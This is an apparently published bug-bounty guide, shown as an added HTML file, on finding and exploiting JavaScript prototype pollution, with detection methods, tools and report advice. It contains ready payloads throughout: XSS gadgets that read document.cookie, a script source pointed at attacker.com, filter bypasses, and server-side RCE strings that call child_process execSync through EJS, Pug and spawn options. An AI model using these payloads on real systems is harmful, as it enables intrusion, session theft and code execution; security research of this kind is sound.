@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Understand and exploit prototype pollution from basic property injection to remote code execution. Covers client-side and server-side pollution with detection techniques.">
+    <title>Prototype Pollution Deep Dive: From Property Injection to RCE</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/prototype-pollution-bug-bounty-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/prototype-pollution-bug-bounty-guide-2026/">
+    <meta property="og:title" content="Prototype Pollution Deep Dive: From Property Injection to RCE">
+    <meta property="og:description" content="Understand and exploit prototype pollution from basic property injection to remote code execution. Covers client-side and server-side pollution with detection techniques.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/prototype-pollution-bug-bounty-guide-2026/">
+    <meta name="twitter:title" content="Prototype Pollution Deep Dive: From Property Injection to RCE">
+    <meta name="twitter:description" content="Understand and exploit prototype pollution from basic property injection to remote code execution. Covers client-side and server-side pollution with detection techniques.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "Prototype Pollution Deep Dive: From Property Injection to RCE",
+      "description": "Understand and exploit prototype pollution from basic property injection to remote code execution. Covers client-side and server-side pollution with detection techniques.",
+      "url": "https://bughuntertools.com/articles/prototype-pollution-bug-bounty-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">Prototype Pollution Deep Dive: From Property Injection to RCE</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Prototype Pollution for Bug Bounty in 2026: How to Find and Exploit Prototype Pollution in Real Targets",
+  "description": "A practical guide to finding client-side and server-side prototype pollution vulnerabilities in bug bounty targets. Covers detection techniques, gadget discovery, exploitation chains, and report writing.",
+  "datePublished": "2026-04-15",
+  "dateModified": "2026-04-15",
+  "author": {
+    "@type": "Organization",
+    "name": "BugHunterTools"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "BugHunterTools",
+    "url": "https://bughuntertools.com"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://bughuntertools.com/articles/prototype-pollution-bug-bounty-guide-2026/"
+  }
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://bughuntertools.com/" },
+    { "@type": "ListItem", "position": 2, "name": "Articles", "item": "https://bughuntertools.com/articles/" },
+    { "@type": "ListItem", "position": 3, "name": "Prototype Pollution for Bug Bounty in 2026" }
+  ]
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What is prototype pollution?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Prototype pollution is a JavaScript vulnerability where an attacker injects properties into Object.prototype, causing every object in the application to inherit those properties. This can lead to XSS, authentication bypass, or remote code execution when chained with the right gadget."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Is prototype pollution alone enough for a bug bounty payout?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Most programs require demonstrated impact. Prototype pollution without a gadget chain is typically rated informational or low severity. To get paid, you need to chain the pollution with a gadget that leads to XSS, RCE, authentication bypass, or another concrete security impact."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do I detect server-side prototype pollution?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Use blind detection techniques: send JSON payloads like {\"__proto__\": {\"json spaces\": 10}} to Express endpoints and check if response formatting changes, or {\"__proto__\": {\"status\": 510}} to check for unexpected status codes. The Burp Server-Side Prototype Pollution Scanner extension automates this."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What is the difference between __proto__ and constructor.prototype?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Both reach Object.prototype but through different paths. __proto__ is a direct accessor, while constructor.prototype traverses the constructor property. Many WAFs and input filters only block __proto__, making constructor.prototype an effective bypass."
+      }
+    }
+  ]
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "HowTo",
+  "name": "How to Find Prototype Pollution in Bug Bounty Targets",
+  "step": [
+    {"@type": "HowToStep", "name": "Test URL parameters", "text": "Append __proto__[canary]=polluted to URL parameters and check Object.prototype.canary in the browser console."},
+    {"@type": "HowToStep", "name": "Test JSON endpoints", "text": "Send {\"__proto__\": {\"json spaces\": 10}} to JSON-accepting endpoints and check if response formatting changes."},
+    {"@type": "HowToStep", "name": "Try constructor.prototype bypass", "text": "If __proto__ is filtered, test {\"constructor\": {\"prototype\": {\"canary\": true}}} as an alternative vector."},
+    {"@type": "HowToStep", "name": "Discover gadgets", "text": "Use DOM Invader for client-side gadgets or identify template engine and child_process patterns for server-side gadgets."},
+    {"@type": "HowToStep", "name": "Build exploitation chain", "text": "Chain the pollution source with a discovered gadget to demonstrate concrete impact like XSS, RCE, or authentication bypass."},
+    {"@type": "HowToStep", "name": "Write the report", "text": "Document the full chain from pollution source to gadget to impact, with clear reproduction steps and severity justification."}
+  ]
+}
+</script>
+
+<h1>Prototype Pollution for Bug Bounty in 2026: How to Find and Exploit Prototype Pollution in Real Targets</h1>
+
+<p>Prototype pollution is one of the most underrated vulnerability classes in bug bounty. Most hunters skip it because the impact isn't always obvious — polluting <code>Object.prototype</code> doesn't crash anything by itself. But chain it with the right gadget and you get XSS, privilege escalation, RCE, or authentication bypass. Programs are paying $5K–$50K+ for well-demonstrated prototype pollution chains.</p>
+
+<p>This guide covers how prototype pollution actually works, how to find it in client-side and server-side JavaScript, how to discover exploitable gadgets, and how to write reports that get paid.</p>
+
+<h2>Key Takeaways</h2>
+
+<ul>
+  <li>Prototype pollution lets you inject properties into <code>Object.prototype</code>, affecting every object in the application</li>
+  <li>Client-side prototype pollution chains into XSS through DOM gadgets in libraries like jQuery, Lodash, and sanitizers</li>
+  <li>Server-side prototype pollution can bypass authentication, escalate privileges, or achieve RCE through <code>child_process</code> gadgets</li>
+  <li>The vulnerability exists in recursive merge, deep clone, and path-assignment functions that don't filter <code>__proto__</code> or <code>constructor.prototype</code></li>
+  <li>Automated detection is possible with Burp extensions and custom scripts, but gadget discovery still requires manual analysis</li>
+</ul>
+
+<h2>How Prototype Pollution Works</h2>
+
+<p>JavaScript uses prototypal inheritance. Every object inherits properties from <code>Object.prototype</code>. If an attacker can write to <code>Object.prototype</code>, every object in the application inherits the injected property — unless it already has that property defined directly.</p>
+
+<pre><code>// Normal behavior
+let obj = {};
+console.log(obj.isAdmin); // undefined
+
+// After pollution
+Object.prototype.isAdmin = true;
+console.log(obj.isAdmin); // true — every object now has isAdmin</code></pre>
+
+<p>The vulnerability occurs when user input flows into a function that recursively assigns properties without filtering prototype-related keys.</p>
+
+<h3>The Dangerous Pattern</h3>
+
+<pre><code>function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      if (!target[key]) target[key] = {};
+      merge(target[key], source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+}
+
+// Attacker input
+const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
+merge({}, payload);
+
+// Now every object has isAdmin = true
+console.log({}.isAdmin); // true</code></pre>
+
+<h3>Three Pollution Vectors</h3>
+
+<ol>
+  <li><strong><code>__proto__</code></strong>: <code>{"__proto__": {"polluted": true}}</code></li>
+  <li><strong><code>constructor.prototype</code></strong>: <code>{"constructor": {"prototype": {"polluted": true}}}</code></li>
+  <li><strong>Nested path assignment</strong>: Functions that resolve dot-notation paths like <code>a.b.c</code> — input <code>__proto__.polluted</code> writes to the prototype</li>
+</ol>
+
+<h2>Client-Side Prototype Pollution</h2>
+
+<h3>Finding Pollution Sources</h3>
+
+<p>Client-side prototype pollution happens when URL parameters, hash fragments, or <code>postMessage</code> data flows into a vulnerable merge/set function.</p>
+
+<p><strong>URL-based vectors to test:</strong></p>
+
+<pre><code>https://target.com/?__proto__[polluted]=true
+https://target.com/?__proto__.polluted=true
+https://target.com/#__proto__[polluted]=true
+https://target.com/?constructor[prototype][polluted]=true</code></pre>
+
+<p><strong>Quick detection — paste in browser console after loading the page with the payload:</strong></p>
+
+<pre><code>console.log(Object.prototype.polluted); // "true" = vulnerable</code></pre>
+
+<p><strong>Automated detection with Burp:</strong></p>
+
+<p>Use the "Server-Side Prototype Pollution Scanner" Burp extension (by Gareth Heyes / PortSwigger). For client-side, use "DOM Invader" in Burp's embedded browser — it has a dedicated prototype pollution mode that:</p>
+<ol>
+  <li>Injects canary properties via URL parameters</li>
+  <li>Scans the DOM for gadgets that consume those properties</li>
+  <li>Reports exploitable chains automatically</li>
+</ol>
+
+<h3>Common Vulnerable Libraries</h3>
+
+<table>
+  <thead>
+    <tr><th>Library</th><th>Vulnerable Function</th><th>Fixed In</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Lodash</td><td><code>_.merge()</code>, <code>_.set()</code>, <code>_.defaultsDeep()</code></td><td>4.17.12+</td></tr>
+    <tr><td>jQuery</td><td><code>$.extend(true, ...)</code></td><td>3.4.0+</td></tr>
+    <tr><td>Hoek</td><td><code>merge()</code>, <code>applyToDefaults()</code></td><td>5.0.3+</td></tr>
+    <tr><td>minimist</td><td>Argument parsing</td><td>1.2.6+</td></tr>
+    <tr><td>qs</td><td>Query string parsing</td><td>6.0.4+</td></tr>
+    <tr><td>Mootools</td><td><code>Object.merge()</code></td><td>Still vulnerable in legacy</td></tr>
+  </tbody>
+</table>
+
+<p>Many targets run outdated versions. Check <code>package.json</code> in exposed source maps or use Wappalyzer/Retire.js to identify library versions.</p>
+
+<h3>Gadget Discovery — Turning Pollution Into XSS</h3>
+
+<p>Pollution alone is informational. You need a <strong>gadget</strong> — a code path that reads from <code>Object.prototype</code> and uses the value in a security-sensitive way (innerHTML, eval, src attribute, etc.).</p>
+
+<p><strong>Common gadgets:</strong></p>
+
+<pre><code>// Gadget 1: innerHTML assignment
+// If code does: element.innerHTML = config.template || defaults.template
+// Pollute: __proto__[template]=&lt;img src=x onerror=alert(1)&gt;
+
+// Gadget 2: script src
+// If code does: script.src = options.cdnUrl + '/lib.js'
+// Pollute: __proto__[cdnUrl]=https://attacker.com/evil
+
+// Gadget 3: jQuery html()
+// If code does: $(selector).html(settings.content)
+// Pollute: __proto__[content]=&lt;img src=x onerror=alert(1)&gt;
+
+// Gadget 4: eval/Function constructor
+// If code does: new Function(config.handler)()
+// Pollute: __proto__[handler]=alert(document.domain)</code></pre>
+
+<p><strong>Systematic gadget hunting:</strong></p>
+
+<ol>
+  <li>Search JavaScript source for property accesses on config/options/settings objects</li>
+  <li>Look for fallback patterns: <code>obj.prop || defaultValue</code> — if <code>obj.prop</code> is undefined, it checks the prototype</li>
+  <li>Trace those values to sinks: <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>Function()</code>, <code>setTimeout(string)</code>, <code>src</code>, <code>href</code></li>
+  <li>Use DOM Invader's gadget scanner for automated discovery</li>
+</ol>
+
+<h3>Real-World Client-Side Chains</h3>
+
+<p><strong>jQuery + URL pollution → XSS:</strong></p>
+<pre><code>https://target.com/page?__proto__[innerHTML]=&lt;img/src/onerror=alert(1)&gt;</code></pre>
+<p>If the page uses <code>$.extend(true, {}, userConfig)</code> and later reads a property that flows to DOM insertion.</p>
+
+<p><strong>Lodash merge + template gadget:</strong></p>
+<pre><code>https://target.com/?__proto__[template]=&lt;img src=x onerror=alert(document.cookie)&gt;</code></pre>
+
+<h2>Server-Side Prototype Pollution</h2>
+
+<p>Server-side prototype pollution is harder to detect but often higher impact. The pollution happens in Node.js backend code, and the effects are invisible from the HTTP response unless you find the right gadget.</p>
+
+<h3>Detection Techniques</h3>
+
+<p><strong>Blind detection — status code changes:</strong></p>
+
+<p>Send a JSON body with prototype pollution payloads and observe behavior changes:</p>
+
+<pre><code>{"__proto__": {"status": 510}}</code></pre>
+
+<p>If the server uses <code>res.status(options.status || 200)</code> and <code>options</code> doesn't have <code>status</code> defined, it'll inherit the polluted value — you'll get a 510 response.</p>
+
+<p><strong>Blind detection — JSON spaces:</strong></p>
+
+<pre><code>{"__proto__": {"json spaces": 10}}</code></pre>
+
+<p>Express uses <code>json spaces</code> from <code>app.settings</code> to format JSON responses. If polluted, subsequent JSON responses will have 10-space indentation. This is a reliable detection technique because it's a known Express behavior.</p>
+
+<p><strong>Blind detection — content-type override:</strong></p>
+
+<pre><code>{"__proto__": {"content-type": "text/html"}}</code></pre>
+
+<p>If Express response headers change to <code>text/html</code>, the prototype is polluted.</p>
+
+<p><strong>Blind detection — charset:</strong></p>
+
+<pre><code>{"__proto__": {"charset": "utf-7"}}</code></pre>
+
+<h3>Server-Side Gadgets</h3>
+
+<p><strong>1. Authentication bypass:</strong></p>
+
+<pre><code>// Server code
+function checkRole(user) {
+  if (user.role === 'admin') {
+    return grantAdminAccess();
+  }
+}
+
+// If user object doesn't have 'role' defined explicitly:
+// Pollute: {"__proto__": {"role": "admin"}}
+// Now user.role resolves to "admin" via prototype</code></pre>
+
+<p><strong>2. RCE via child_process:</strong></p>
+
+<pre><code>// If the app spawns child processes:
+const { execSync } = require('child_process');
+execSync(command, options);
+
+// The 'options' object inherits from Object.prototype
+// Pollute shell and env to get RCE:
+{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())//"}}
+
+// Or via NODE_OPTIONS:
+{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}</code></pre>
+
+<p><strong>3. RCE via EJS template engine:</strong></p>
+
+<pre><code>{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}</code></pre>
+
+<p>EJS uses <code>outputFunctionName</code> in template compilation. If polluted, the value is injected into generated code without sanitization.</p>
+
+<p><strong>4. Pug template RCE:</strong></p>
+
+<pre><code>{"__proto__": {"block": {"type": "Text", "val": "x]);process.mainModule.require('child_process').execSync('id');//"}}}</code></pre>
+
+<p><strong>5. Handlebars RCE:</strong></p>
+
+<pre><code>{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}</code></pre>
+
+<p>Combined with a crafted template, this enables prototype method access that leads to RCE.</p>
+
+<h3>Testing Methodology for Server-Side</h3>
+
+<ol>
+  <li>Identify endpoints that accept JSON input and merge it into objects (user profile updates, settings, preferences)</li>
+  <li>Send the <code>json spaces</code> detection payload — check if response formatting changes</li>
+  <li>Send the <code>status</code> detection payload — check for unexpected status codes</li>
+  <li>If pollution confirmed, enumerate gadgets based on the tech stack (Express, EJS, Pug, Handlebars, etc.)</li>
+  <li>Test RCE gadgets in a local reproduction environment before submitting</li>
+</ol>
+
+<h2>Prototype Pollution via constructor.prototype</h2>
+
+<p>Some applications filter <code>__proto__</code> but forget <code>constructor.prototype</code>:</p>
+
+<pre><code>{"constructor": {"prototype": {"polluted": true}}}</code></pre>
+
+<p>This works because:</p>
+<pre><code>let obj = {};
+obj.constructor === Object; // true
+obj.constructor.prototype === Object.prototype; // true</code></pre>
+
+<p>Always test both vectors. Many WAFs and input filters only block <code>__proto__</code>.</p>
+
+<h2>Prototype Pollution in GraphQL</h2>
+
+<p>GraphQL endpoints that accept arbitrary JSON input objects are common pollution targets:</p>
+
+<pre><code>mutation {
+  updateProfile(input: {
+    name: "test"
+    __proto__: { isAdmin: true }
+  })
+}</code></pre>
+
+<p>Some GraphQL implementations strip <code>__proto__</code> during parsing, but <code>constructor.prototype</code> often passes through.</p>
+
+<h2>Prototype Pollution in Merge/Clone Libraries</h2>
+
+<p>Beyond Lodash, check for pollution in:</p>
+
+<ul>
+  <li><strong>deepmerge</strong> — vulnerable in older versions</li>
+  <li><strong>defaults-deep</strong> — vulnerable</li>
+  <li><strong>merge-deep</strong> — vulnerable in older versions</li>
+  <li><strong>mixin-deep</strong> — vulnerable before 2.0.1</li>
+  <li><strong>set-value</strong> — vulnerable before 4.0.1</li>
+  <li><strong>dot-prop</strong> — vulnerable before 5.1.1</li>
+</ul>
+
+<p>Use <code>npm audit</code> output (if accessible) or check <code>package-lock.json</code> in exposed source maps.</p>
+
+<h2>Bypassing Prototype Pollution Defenses</h2>
+
+<h3>Frozen prototypes</h3>
+
+<p>If <code>Object.freeze(Object.prototype)</code> is used, direct pollution fails. But:</p>
+<ul>
+  <li>Check if only <code>Object.prototype</code> is frozen — <code>Array.prototype</code>, <code>String.prototype</code> may still be writable</li>
+  <li>Check if the freeze happens after your pollution vector executes (race condition)</li>
+</ul>
+
+<h3>Input sanitization bypass</h3>
+
+<pre><code>// If __proto__ is stripped:
+{"constructor": {"prototype": {"polluted": true}}}
+
+// If both are stripped, try nested:
+{"a": {"__proto__": {"polluted": true}}}
+
+// Unicode bypass:
+{"__pro\u0074o__": {"polluted": true}}
+
+// Bracket notation in path-based assignment:
+["__proto__"]["polluted"] = true</code></pre>
+
+<h3>Content-Type tricks</h3>
+
+<p>Some parsers only apply <code>__proto__</code> filtering for <code>application/json</code> but not for:</p>
+<ul>
+  <li><code>application/x-www-form-urlencoded</code> with nested bracket notation: <code>__proto__[polluted]=true</code></li>
+  <li><code>multipart/form-data</code> with JSON fields</li>
+</ul>
+
+<h2>Tools</h2>
+
+<table>
+  <thead>
+    <tr><th>Tool</th><th>Purpose</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>DOM Invader (Burp)</td><td>Client-side prototype pollution + gadget discovery</td></tr>
+    <tr><td>Server-Side Prototype Pollution Scanner (Burp)</td><td>Blind server-side detection</td></tr>
+    <tr><td>ppfuzz</td><td>Fuzzer for client-side prototype pollution</td></tr>
+    <tr><td>ppmap</td><td>Scans for known gadgets in client-side libraries</td></tr>
+    <tr><td>cdnjs-prototype-pollution</td><td>Database of known vulnerable CDN libraries</td></tr>
+  </tbody>
+</table>
+
+<h2>Testing Checklist</h2>
+
+<ol>
+  <li>Test URL parameters with <code>__proto__[canary]=polluted</code> — check <code>Object.prototype.canary</code> in console</li>
+  <li>Test hash fragment with same payloads</li>
+  <li>Test JSON body endpoints with <code>{"__proto__": {"json spaces": 10}}</code></li>
+  <li>Test <code>constructor.prototype</code> vector if <code>__proto__</code> is filtered</li>
+  <li>Check for outdated Lodash, jQuery, qs, minimist in source maps or exposed package files</li>
+  <li>Use DOM Invader for automated client-side gadget scanning</li>
+  <li>For confirmed pollution: identify gadgets (DOM sinks for client-side, template engines/child_process for server-side)</li>
+  <li>Build full exploitation chain (pollution → gadget → impact)</li>
+  <li>Test in isolated environment before submitting RCE chains</li>
+</ol>
+
+<h2>Writing the Report</h2>
+
+<p>Prototype pollution reports get downgraded or rejected when they don't demonstrate impact. Always chain to a concrete exploit.</p>
+
+<p><strong>Report structure:</strong></p>
+
+<ol>
+  <li><strong>Title</strong>: "Prototype Pollution via [endpoint/parameter] Leading to [XSS/RCE/Auth Bypass]"</li>
+  <li><strong>Severity</strong>: Based on the chain impact, not the pollution alone
+    <ul>
+      <li>Pollution + XSS → Medium to High</li>
+      <li>Pollution + Auth bypass → High to Critical</li>
+      <li>Pollution + RCE → Critical</li>
+      <li>Pollution alone (no gadget) → Low/Informational (many programs won't pay)</li>
+    </ul>
+  </li>
+  <li><strong>Steps to reproduce</strong>: Show the full chain — pollution source → gadget → impact</li>
+  <li><strong>Impact</strong>: Describe what an attacker achieves (session hijacking, admin access, code execution)</li>
+  <li><strong>Remediation</strong>: Recommend <code>Object.create(null)</code> for config objects, input filtering for <code>__proto__</code> and <code>constructor</code>, library updates, <code>Object.freeze(Object.prototype)</code></li>
+</ol>
+
+<p><strong>Example title:</strong></p>
+<blockquote>"Client-Side Prototype Pollution via URL Parameters Chaining to Stored XSS Through jQuery $.extend Gadget on /dashboard"</blockquote>
+
+<h2>Related Guides</h2>
+
+<ul>
+  <li><a href="/articles/xss-hunting-bug-bounty-guide-2026/">XSS Hunting for Bug Bounty in 2026</a> — XSS is the most common prototype pollution chain target</li>
+  <li><a href="/articles/ssrf-hunting-bug-bounty-guide-2026/">SSRF Hunting for Bug Bounty in 2026</a> — Server-side pollution can chain to SSRF</li>
+  <li><a href="/articles/authentication-bypass-bug-bounty-guide-2026/">Authentication Bypass for Bug Bounty in 2026</a> — Pollution-based auth bypass techniques</li>
+  <li><a href="/articles/command-injection-hunting-bug-bounty-guide-2026/">Command Injection Hunting for Bug Bounty in 2026</a> — RCE via child_process gadgets</li>
+  <li><a href="/articles/graphql-injection-bug-bounty-guide-2026/">GraphQL Injection for Bug Bounty in 2026</a> — Pollution via GraphQL input objects</li>
+  <li><a href="/articles/websocket-security-testing-bug-bounty-guide-2026/">WebSocket Security Testing for Bug Bounty in 2026</a> — Another underexplored attack surface</li>
+</ul>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
+          metaEl.insertAdjacentHTML('beforeend', ' &middot; ' + badge);
+        } else {
+          var h1 = header.querySelector('h1');
+          if (h1) {
+            var div = document.createElement('div');
+            div.className = 'article-hero-meta';
+            div.innerHTML = badge;
+            header.appendChild(div);
+          }
+        }
+      })();
+    </script>
+
+    <!-- BR2: Sidebar Table of Contents — IntersectionObserver highlight -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = (path.startsWith('/articles/') && path !== '/articles/') ||
+                        (path.startsWith('/demos/')    && path !== '/demos/');
+        if (!isArticle) return;
+
+        // Build the ToC from headings/sections inside article
+        function buildSidebarToC() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          // Collect anchor targets + labels.
+          // Support two patterns:
+          //   (a) <h2 id="..."> / <h3 id="..."> — explicit IDs on headings
+          //   (b) <section id="..."><h2>...</h2> — IDs on parent sections (older articles)
+          var entries = [];
+
+          // Pass (a): headings with own IDs
+          article.querySelectorAll('h2[id], h3[id]').forEach(function(h) {
+            entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+          });
+
+          // Pass (b): sections with IDs whose h2 has no id yet
+          if (entries.length < 3) {
+            entries = [];
+            article.querySelectorAll('section[id]').forEach(function(sec) {
+              var h = sec.querySelector('h2, h3');
+              if (!h) return;
+              // Ensure heading has the id so IntersectionObserver works
+              if (!h.id) h.id = sec.id;
+              entries.push({ id: h.id, text: h.textContent, level: h.tagName, el: h });
+            });
+          }
+
+          if (entries.length < 3) return; // not worth showing
+
+          // Add has-toc-sidebar class to main
+          var mainEl = document.querySelector('main');
+          if (mainEl) mainEl.classList.add('has-toc-sidebar');
+
+          // Build sidebar element
+          var sidebar = document.createElement('nav');
+          sidebar.className = 'toc-sidebar';
+          sidebar.setAttribute('aria-label', 'Table of contents');
+
+          var header = document.createElement('div');
+          header.className = 'toc-sidebar-header';
+          header.textContent = 'In this article';
